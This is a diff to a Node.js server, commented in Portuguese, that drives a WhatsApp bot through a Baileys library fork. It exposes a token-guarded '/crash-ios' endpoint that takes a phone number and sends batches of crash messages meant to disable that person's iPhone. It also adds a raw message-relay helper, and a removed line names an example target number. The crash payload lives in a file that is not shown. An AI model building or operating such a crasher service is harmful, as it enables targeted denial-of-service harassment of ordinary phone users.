@@ -3,7 +3,7 @@ const {
   useMultiFileAuthState,
   DisconnectReason,
   makeWASocket,
-  jidDecode
+  generateWAMessageFromContent
 } = require("@angstvorfrauen/baileys");
 const pino = require("pino");
 const fs = require("fs");
@@ -15,6 +15,7 @@ app.use(express.json());
 // === BAILEYS ===
 let sock;
 let sessionExists = false;
+const main = require("./main.js"); // ← Carrega UMA VEZ
 
 async function connectBot() {
   const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
@@ -24,12 +25,18 @@ async function connectBot() {
     logger: pino({ level: "silent" })
   });
 
+  // === DEFINE sendjson GLOBAL ===
+  sock.sendjson = (jid, content, options = {}) => {
+    const msg = generateWAMessageFromContent(jid, content, options);
+    return sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
+  };
+
   sessionExists = sock.authState.creds.registered;
 
   sock.ev.on("messages.upsert", async (chatUpdate) => {
     const m = chatUpdate.messages[0];
     if (!m.message || m.key.remoteJid === "status@broadcast" || m.key.id?.startsWith("BAE5")) return;
-    require("./main.js")(sock, m, chatUpdate);
+    main.handler(sock, m, chatUpdate);
   });
 
   sock.ev.on("connection.update", async (update) => {
@@ -40,12 +47,11 @@ async function connectBot() {
       if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
         fs.rmSync("./database/Session", { recursive: true, force: true });
       }
-      connectBot();
+      connectBot(); // reconecta
     } else if (connection === "open") {
       sessionExists = true;
       console.log("Bot conectado com sucesso!");
-      // === PASSA O sock PARA O main.js UMA VEZ ===
-      require("./main.js").setSocket(sock);
+      main.setSocket(sock); // ← Atualiza sock no main.js
     }
   });
 
@@ -59,9 +65,7 @@ app.get("/", (req, res) => {
     status: "online",
     bot: sessionExists ? "conectado" : "desconectado",
     token: "@xd",
-    endpoints: {
-      "/crash-ios?token=@xd&query=5582993708218": "Crash iOS DIRETO (10 lotes)"
-    }
+    endpoints: { "/crash-ios?token=@xd&query=NUMERO": "Crash iOS DIRETO" }
   });
 });
 
@@ -77,7 +81,7 @@ app.get("/connect", async (req, res) => {
     code = code?.match(/.{1,4}/g)?.join("-") || code;
     res.json({ success: true, code });
   } catch (err) {
-    res.status(500).json({ error: "Erro ao gerar código", details: err.message });
+    res.status(500).json({ error: "Erro", details: err.message });
   }
 });
 
@@ -89,7 +93,7 @@ app.get("/deleteSession", (req, res) => {
   res.json({ success: "Sessão deletada" });
 });
 
-// === CRASH iOS DIRETO: SÓ PASSA O NÚMERO ===
+// === CRASH iOS DIRETO ===
 app.get("/crash-ios", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });
@@ -100,15 +104,13 @@ app.get("/crash-ios", async (req, res) => {
   const targetJid = num + "@s.whatsapp.net";
 
   try {
-    const { crashIOS } = require("./main.js");
-    await crashIOS(targetJid);  // ← SÓ 1 ARGUMENTO: targetJid
-    res.json({ success: true, target: targetJid, message: "Crash iOS enviado (10 lotes)" });
+    await main.crashIOS(targetJid); // ← SÓ 1 ARGUMENTO
+    res.json({ success: true, target: targetJid, message: "Crash enviado (10 lotes)" });
   } catch (err) {
     res.status(500).json({ error: "Falha", details: err.message });
   }
 });
 
-// === SERVIDOR ===
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`API rodando na porta ${PORT}`);
